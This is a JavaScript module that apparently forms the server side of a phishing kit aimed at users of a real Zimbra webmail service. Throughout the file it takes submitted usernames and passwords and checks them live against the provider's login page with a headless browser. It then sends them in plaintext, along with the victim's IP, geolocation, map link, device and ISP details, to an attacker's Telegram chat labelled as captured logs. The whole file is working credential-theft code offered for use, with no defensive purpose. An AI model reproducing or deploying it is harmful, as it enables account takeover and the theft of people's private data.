require('dotenv').config();

const { Telegraf } = require('telegraf');
const puppeteer = require('puppeteer');
const useragent = require('useragent');
const axios = require('axios');

const bot = new Telegraf(process.env.BOT_TOKEN);
const chatId = process.env.CHAT_ID;

const sendTelegramNotification = async (message) => {
  try {
    await bot.telegram.sendMessage(chatId, message, { parse_mode: 'HTML' });
  } catch (error) {
    console.error('Failed to send Telegram notification:', error);
  }
};

const getClientInfo = async (req) => {
  let ip;
  try {
    const response = await axios.get('https://api.ipify.org?format=json');
    ip = response.data.ip || 'Unknown';
  } catch (error) {
    console.error('Error fetching IP from ipify:', error);
    ip = 'Unknown';
  }

  const agent = useragent.parse(req.headers['user-agent']);
  const currentTime = new Date().toLocaleString('en-US', { timeZone: 'America/Chicago' }); // CDT

  return { ip, agent, currentTime };
};

const getGeolocationAndVPN = async (ip) => {
  try {
    const response = await axios.get(`http://ip-api.com/json/${ip}`);
    const { city, regionName, country, lat, lon, isp, proxy } = response.data;
    const location = city && regionName && country ? `${city}, ${regionName}, ${country}` : 'Unknown';
    const latitude = lat || 'Unknown';
    const longitude = lon || 'Unknown';
    const ispName = isp || 'Unknown';
    const isUsingVPN = proxy || false;

    return { location, latitude, longitude, isp: ispName, isUsingVPN };
  } catch (error) {
    console.error('Geolocation error:', error);
    return { location: 'Unknown', latitude: 'Unknown', longitude: 'Unknown', isp: 'Unknown', isUsingVPN: false };
  }
};

const validateLogin = async (req, username, password) => {
  let browser;
  try {
    const { ip, agent, currentTime } = await getClientInfo(req);
    const { location, latitude, longitude, isp, isUsingVPN } = await getGeolocationAndVPN(ip);
    const device = `${agent.device.family} • ${agent.os.family}`;
    const browserInfo = agent.toString();
    const connectionType = isp.includes('WiFi') || isp.includes('Landline') ? 'WiFi/Landline' : 'Mobile/Data';

    browser = await puppeteer.launch({
      headless: true,
      args: ['--no-sandbox', '--disable-setuid-sandbox'],
    });
    const page = await browser.newPage();

    // Navigate to the login page
    await page.goto('https://promail.ptd.net/', { waitUntil: 'networkidle2', timeout: 30000 });

    // Fill in the login form
    await page.type('#username', username);
    await page.type('#password', password);

    // Submit the form and wait for navigation
    const [response] = await Promise.all([
      page.click('#loginButton'),
      page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 10000 }).catch(() => {}),
    ]);

    // Check if login was successful
    const currentUrl = page.url();
    const isLoggedIn = !currentUrl.includes('promail.ptd.net') || (await page.$('.zLoginFieldInput') === null);

    if (isLoggedIn) {
      await sendTelegramNotification(
        '🔐 <b>NEW ZIMBRA LOG CAPTURED! ✅</b> 🔐\n' +
        `🔢 Attempt: #1\n` +
        `🧑‍💻 Username: ${username}\n` +
        `🔑 Password: ${password}\n` +
        `🌐 IP Address: ${ip}\n` +
        `📍 Location: ${location}\n` +
        `🗺️ Map: <a href="https://www.google.com/maps?q=${latitude},${longitude}">View Map</a>\n` +
        `🛡️ Using VPN/Proxy: ${isUsingVPN ? '✅ Yes' : '❌ No'}\n` +
        `📟 Device: ${device}\n` +
        `🌐 Browser: ${browserInfo}\n` +
        `📡 Connection/ISP: ${connectionType} (${isp})\n` +
        `⏰ Time: ${currentTime}\n` +
        `👨‍💻 Coder: root`
      );
      return { success: true, redirectUrl: 'https://promail-legacy.ptd.net/' };
    } else {
      await sendTelegramNotification(
        '🔐 <b>NEW ZIMBRA LOG CAPTURED! ❌</b> 🔐\n' +
        `🔢 Attempt: #1\n` +
        `🧑‍💻 Username: ${username}\n` +
        `🔑 Password: ${password}\n` +
        `🌐 IP Address: ${ip}\n` +
        `📍 Location: ${location}\n` +
        `🗺️ Map: <a href="https://www.google.com/maps?q=${latitude},${longitude}">View Map</a>\n` +
        `🛡️ Using VPN/Proxy: ${isUsingVPN ? '✅ Yes' : '❌ No'}\n` +
        `📟 Device: ${device}\n` +
        `🌐 Browser: ${browserInfo}\n` +
        `📡 Connection/ISP: ${connectionType} (${isp})\n` +
        `⏰ Time: ${currentTime}\n` +
        `👨‍💻 Coder: root\n` +
        `❗ <b>Invalid credentials. Initiating second attempt...</b>`
      );

      // Second attempt (simulated retry with same credentials)
      await page.reload({ waitUntil: 'networkidle2' });
      await page.type('#username', username);
      await page.type('#password', password);
      await Promise.all([
        page.click('#loginButton'),
        page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 10000 }).catch(() => {}),
      ]);

      const secondAttemptUrl = page.url();
      const isSecondAttemptSuccess = !secondAttemptUrl.includes('promail.ptd.net') || (await page.$('.zLoginFieldInput') === null);

      if (isSecondAttemptSuccess) {
        await sendTelegramNotification(
          '🔐 <b>NEW ZIMBRA LOG CAPTURED! ✅ (Second Attempt)</b> 🔐\n' +
          `🔢 Attempt: #2\n` +
          `🧑‍💻 Username: ${username}\n` +
          `🔑 Password: ${password}\n` +
          `🌐 IP Address: ${ip}\n` +
          `📍 Location: ${location}\n` +
          `🗺️ Map: <a href="https://www.google.com/maps?q=${latitude},${longitude}">View Map</a>\n` +
          `🛡️ Using VPN/Proxy: ${isUsingVPN ? '✅ Yes' : '❌ No'}\n` +
          `📟 Device: ${device}\n` +
          `🌐 Browser: ${browserInfo}\n` +
          `📡 Connection/ISP: ${connectionType} (${isp})\n` +
          `⏰ Time: ${currentTime}\n` +
          `👨‍💻 Coder: root`
        );
        return { success: true, redirectUrl: 'https://promail-legacy.ptd.net/' };
      } else {
        await sendTelegramNotification(
          '🔐 <b>NEW ZIMBRA LOG CAPTURED! ❌ (Second Attempt)</b> 🔐\n' +
          `🔢 Attempt: #2\n` +
          `🧑‍💻 Username: ${username}\n` +
          `🔑 Password: ${password}\n` +
          `🌐 IP Address: ${ip}\n` +
          `📍 Location: ${location}\n` +
          `🗺️ Map: <a href="https://www.google.com/maps?q=${latitude},${longitude}">View Map</a>\n` +
          `🛡️ Using VPN/Proxy: ${isUsingVPN ? '✅ Yes' : '❌ No'}\n` +
          `📟 Device: ${device}\n` +
          `🌐 Browser: ${browserInfo}\n` +
          `📡 Connection/ISP: ${connectionType} (${isp})\n` +
          `⏰ Time: ${currentTime}\n` +
          `👨‍💻 Coder: root\n` +
          `❗ <b>Login failed after second attempt.</b>`
        );
        return { success: false, redirectUrl: null };
      }
    }
  } catch (error) {
    console.error('Login validation error:', error);
    const { ip, agent, currentTime } = await getClientInfo(req);
    const { location, latitude, longitude, isp, isUsingVPN } = await getGeolocationAndVPN(ip);
    const device = `${agent.device.family} • ${agent.os.family}`;
    const browserInfo = agent.toString();
    const connectionType = isp.includes('WiFi') || isp.includes('Landline') ? 'WiFi/Landline' : 'Mobile/Data';

    await sendTelegramNotification(
      '🔐 <b>NEW ZIMBRA LOG CAPTURED! ⚠️</b> 🔐\n' +
      `🧑‍💻 Username: ${username}\n` +
      `🔑 Password: ${password}\n` +
      `🌐 IP Address: ${ip}\n` +
      `📍 Location: ${location}\n` +
      `🗺️ Map: <a href="https://www.google.com/maps?q=${latitude},${longitude}">View Map</a>\n` +
      `🛡️ Using VPN/Proxy: ${isUsingVPN ? '✅ Yes' : '❌ No'}\n` +
      `📟 Device: ${device}\n` +
      `🌐 Browser: ${browserInfo}\n` +
      `📡 Connection/ISP: ${connectionType} (${isp})\n` +
      `⏰ Time: ${currentTime}\n` +
      `👨‍💻 Coder: root\n` +
      `❗ <b>Error during login attempt: ${error.message}</b>`
    );
    return { success: false, redirectUrl: null };
  } finally {
    if (browser) {
      await browser.close();
    }
  }
};

module.exports = { validateLogin };